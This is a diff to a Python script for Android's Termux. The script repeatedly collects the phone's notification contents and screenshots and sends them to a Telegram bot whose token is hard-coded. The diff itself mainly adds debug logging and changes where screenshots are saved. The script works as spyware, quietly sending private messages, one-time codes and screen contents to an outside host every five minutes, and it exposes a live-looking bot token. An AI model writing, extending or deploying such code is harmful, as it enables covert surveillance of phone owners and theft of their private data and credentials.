@@ -3,6 +3,14 @@ import requests
 import json
 from datetime import datetime
 import time
+import logging
+
+# Setup logging
+logging.basicConfig(filename="script.log", level=logging.DEBUG)
+
+def log_debug(message):
+    logging.debug(message)
+    print(message)
 
 # Telegram Bot Configuration
 BOT_TOKEN = "7762660744:AAHCxlWJvkwnI9ACKDX_zim2G8FEQa1_Drk"
@@ -14,9 +22,9 @@ def send_telegram_message(message):
     data = {"chat_id": CHAT_ID, "text": message}
     try:
         response = requests.post(url, data=data)
-        response.raise_for_status()
+        log_debug(f"Telegram Response (Message): {response.json()}")
     except Exception as e:
-        print(f"Failed to send message: {e}")
+        log_debug(f"Failed to send message: {e}")
 
 # Function to send a file to Telegram
 def send_telegram_file(file_path, caption=""):
@@ -26,35 +34,43 @@ def send_telegram_file(file_path, caption=""):
             files = {"document": file}
             data = {"chat_id": CHAT_ID, "caption": caption}
             response = requests.post(url, data=data, files=files)
-            response.raise_for_status()
+            log_debug(f"Telegram Response (File): {response.json()}")
     except Exception as e:
-        print(f"Failed to send file: {e}")
+        log_debug(f"Failed to send file: {e}")
 
-# Function to get notifications (using Termux API)
+# Function to get notifications via Termux
 def get_notifications():
     try:
-        result = os.popen("termux-notification-list").read()
-        notifications = json.loads(result)
+        # Use Termux to get the list of notifications
+        output = os.popen("termux-notification-list").read()
+        notifications = json.loads(output)
+        
         messages = []
         for notification in notifications:
-            app_name = notification.get("packageName", "Unknown")
+            app = notification.get("packageName", "Unknown App")
             title = notification.get("title", "No Title")
             text = notification.get("text", "No Content")
-            messages.append(f"App: {app_name}\nTitle: {title}\nText: {text}")
+            messages.append(f"App: {app}\nTitle: {title}\nText: {text}")
+        
+        log_debug(f"Parsed Notifications: {messages}")
         return "\n\n".join(messages)
     except Exception as e:
-        print(f"Failed to get notifications: {e}")
+        log_debug(f"Failed to get notifications: {e}")
         return "Failed to retrieve notifications."
 
-# Function to take a screenshot (using Termux API)
+# Function to take a screenshot via Termux
 def take_screenshot():
     try:
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        screenshot_path = f"/sdcard/screenshot_{timestamp}.png"
-        os.system(f"termux-screenshot -p {screenshot_path}")
+        screenshot_path = os.path.join(os.getcwd(), f"screenshot_{timestamp}.png")
+        
+        # Use Termux to take the screenshot
+        os.system(f"termux-screenshot {screenshot_path}")
+        log_debug(f"Screenshot saved at: {screenshot_path}")
+        
         return screenshot_path
     except Exception as e:
-        print(f"Failed to take screenshot: {e}")
+        log_debug(f"Failed to take screenshot: {e}")
         return None
 
 # Main function
@@ -70,7 +86,7 @@ def main():
         if screenshot_path and os.path.exists(screenshot_path):
             send_telegram_file(screenshot_path, caption="Screenshot captured")
         
-        # Wait for a specific time before repeating (e.g., 5 minutes)
+        # Wait for 5 minutes before the next iteration
         time.sleep(300)  # 300 seconds = 5 minutes
 
 if __name__ == "__main__":
